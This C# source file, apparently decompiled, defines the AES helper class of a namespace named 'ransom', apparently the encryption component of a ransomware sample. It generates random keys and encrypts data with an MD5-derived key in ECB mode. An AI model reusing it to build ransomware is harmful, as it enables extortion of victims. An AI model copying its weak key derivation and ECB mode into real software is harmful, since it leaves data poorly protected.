using System;
using System.Security.Cryptography;
using System.Text;

namespace ransom;

internal class AES
{
	public static string GenerateRandomString()
	{
		using RandomNumberGenerator randomNumberGenerator = new RNGCryptoServiceProvider();
		byte[] array = new byte[32];
		randomNumberGenerator.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	public static byte[] Encrypt(string string_0, byte[] byte_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(string_0));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		rijndaelManaged.Padding = PaddingMode.ISO10126;
		return rijndaelManaged.CreateEncryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);
	}
}
